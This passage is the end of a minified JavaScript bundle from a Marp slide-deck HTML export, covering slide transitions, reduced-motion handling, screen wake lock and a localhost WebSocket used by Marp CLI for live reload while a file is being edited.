i=getComputedStyle(r).getPropertyValue(le("duration"));i&&(n.defaultDuration=i),((e,t)=>{requestAnimationFrame((()=>{e.style.animationPlayState="running",requestAnimationFrame((()=>t(void 0)))}))})(r,o)})),fe=async e=>oe.has(e)?oe.get(e):(e=>{const t={},n=[];for(const[r,o]of Object.entries(ie))for(const[i,a]of Object.entries(ae)){const s=`marp-${o}transition${a}-${e}`;n.push(ue(s).then((e=>{t[i]=t[i]||{},t[i][r]=e?{...e,name:s}:void 0})))}return Promise.all(n).then((()=>t))})(e).then((t=>(oe.set(e,t),t))),me=e=>Object.values(e).flatMap(Object.values).every((e=>!e)),ge=(e,{type:t,backward:n})=>{const r=e[n?"backward":"forward"],o=(()=>{const e=r[t],n=e=>({[ce]:e.name});if(e)return n(e);if(r.both){const e=n(r.both);return"incoming"===t&&(e[se("direction")]="reverse"),e}})();return!o&&n?ge(e,{type:t,backward:!1}):o||{[ce]:"__bespoke_marp_transition_no_animation__"}},pe=e=>{if(e)try{const t=JSON.parse(e);if((e=>{if("object"!=typeof e)return!1;const t=e;return"string"==typeof t.name&&(void 0===t.duration||"string"==typeof t.duration)})(t))return t}catch(e){}},ve="_tSId",he="_tA",ye="bespoke-marp-transition-warming-up",be=window.matchMedia("(prefers-reduced-motion: reduce)"),we="__bespoke_marp_transition_reduced_outgoing__",xe="__bespoke_marp_transition_reduced_incoming__",ke={forward:{both:void 0,incoming:{name:xe},outgoing:{name:we}},backward:{both:void 0,incoming:{name:xe},outgoing:{name:we}}},$e=e=>{if(!document.startViewTransition)return;const t=t=>(void 0!==t&&(e._tD=t),e._tD);let n;t(!1),((...e)=>{const t=[...new Set(e).values()];return Promise.all(t.map((e=>fe(e)))).then()})(...Array.from(document.querySelectorAll("section[data-transition], section[data-transition-back]")).flatMap((e=>[e.dataset.transition,e.dataset.transitionBack].flatMap((e=>{const t=pe(e);return[null==t?void 0:t.name,(null==t?void 0:t.builtinFallback)?`__builtin__${t.name}`:void 0]})).filter((e=>!!e))))).then((()=>{document.querySelectorAll("style").forEach((e=>{e.innerHTML=e.innerHTML.replace(/--marp-transition-duration:[^;}]*[;}]/g,(e=>e.slice(0,-1)+"!important"+e.slice(-1)))}))}));const r=(n,{back:r,cond:o})=>i=>{var a;const s=t();if(s)return!!i[he]||!("object"!=typeof s||(s.skipTransition(),!i.forSync));if(!o(i))return!0;const l=e.slides[e.slide()],c=()=>{var e;return null!==(e=i.back)&&void 0!==e?e:r},d="data-transition"+(c()?"-back":""),u=l.querySelector(`section[${d}]`);if(!u)return!0;const f=pe(null!==(a=u.getAttribute(d))&&void 0!==a?a:void 0);return!f||((async(e,{builtinFallback:t=!0}={})=>{let n=await fe(e);if(me(n)){if(!t)return;return n=await fe(`__builtin__${e}`),me(n)?void 0:n}return n})(f.name,{builtinFallback:f.builtinFallback}).then((e=>{if(!e){t(!0);try{n(i)}finally{t(!1)}return}let r=e;be.matches&&(console.warn("Use a constant animation to transition because preferring reduced motion by viewer has detected."),r=ke);const o=document.getElementById(ve);o&&o.remove();const a=document.createElement("style");a.id=ve,document.head.appendChild(a),((e,t)=>{const n=[`:root{${le("direction")}:${t.backward?-1:1};}`,":root:has(.bespoke-marp-inactive){cursor:none;}"],r=t=>{var n,o,i;const a=(null===(n=e[t].both)||void 0===n?void 0:n.defaultDuration)||(null===(o=e[t].outgoing)||void 0===o?void 0:o.defaultDuration)||(null===(i=e[t].incoming)||void 0===i?void 0:i.defaultDuration);return"forward"===t?a:a||r("forward")},o=t.duration||r(t.backward?"backward":"forward");void 0!==o&&n.push(`::view-transition-group(*){${de}:${o};}`);const i=e=>Object.entries(e).map((([e,t])=>`${e}:${t};`)).join("");return n.push(`::view-transition-old(root){${i(ge(e,{...t,type:"outgoing"}))}}`,`::view-transition-new(root){${i(ge(e,{...t,type:"incoming"}))}}`),n})(r,{backward:c(),duration:f.duration}).forEach((e=>{var t;return null===(t=a.sheet)||void 0===t?void 0:t.insertRule(e)}));const s=document.documentElement.classList;s.add(ye);let l=!1;const d=()=>{l||(n(i),l=!0,s.remove(ye))},u=()=>{t(!1),a.remove(),s.remove(ye)};try{t(!0);const e=document.startViewTransition(d);t(e),e.finished.finally(u)}catch(e){console.error(e),d(),u()}})),!1)};e.on("prev",r((t=>e.prev({...t,[he]:!0})),{back:!0,cond:e=>{var t;return e.index>0&&!((null===(t=e.fragment)||void 0===t||t)&&n.fragmentIndex>0)}})),e.on("next",r((t=>e.next({...t,[he]:!0})),{cond:t=>t.index+1<e.slides.length&&!(n.fragmentIndex+1<n.fragments.length)})),setTimeout((()=>{e.on("slide",r((t=>e.slide(t.index,{...t,[he]:!0})),{cond:t=>{const n=e.slide();return t.index!==n&&(t.back=t.index<n,!0)}}))}),0),e.on("fragment",(e=>{n=e}))};let Ee;const Le=()=>(void 0===Ee&&(Ee="wakeLock"in navigator&&navigator.wakeLock),Ee),Se=async()=>{const e=Le();if(e)try{return await e.request("screen")}catch(e){console.warn(e)}return null},Pe=async()=>{if(!Le())return;let e;const t=()=>{e&&"visible"===document.visibilityState&&Se()};for(const e of["visibilitychange","fullscreenchange"])document.addEventListener(e,t);return e=await Se(),e};((e=document.getElementById(":$p"))=>{(()=>{const e=f("view");r.dataset.bespokeView=e===a||e===i?e:""})();const t=(e=>{const t=f(e);return m({[e]:void 0}),t})("sync")||void 0;n.from(e,((...e)=>{const t=s.findIndex((e=>u()===e));return e.map((([e,n])=>e[t]&&n)).filter((e=>e))})([[1,1,0],G({key:t})],[[1,1,1],W(e)],[[1,1,0],_],[[1,1,1],b],[[1,0,0],S()],[[1,1,1],T],[[1,1,1],z({history:!1})],[[1,1,0],I()],[[1,1,0],E],[[1,0,0],J],[[1,1,0],re()],[[1,0,0],M()],[[1,0,0],$e],[[1,1,1],w],[[1,1,0],Pe]))})()}();</script><script>window.__marpCliWatchWS="ws://localhost:37717/d6580eecb6ca8cf0406da949e65b9e928c67b43ff5a7e5c2d79ec3237e497500";!function(){"use strict";const e=(n,o=!1)=>{const t=new WebSocket(n);return t.addEventListener("open",(()=>{console.info("[Marp CLI] Observing the change of file..."),o&&location.reload()})),t.addEventListener("close",(()=>{console.warn("[Marp CLI] WebSocket for file watcher was disconnected. Try re-connecting in 5000ms..."),setTimeout((()=>e(n,!0)),5e3)})),t.addEventListener("message",(e=>{"reload"===e.data&&location.reload()})),t};(()=>{const n=window.__marpCliWatchWS;n&&e(n)})()}();</script></body></html>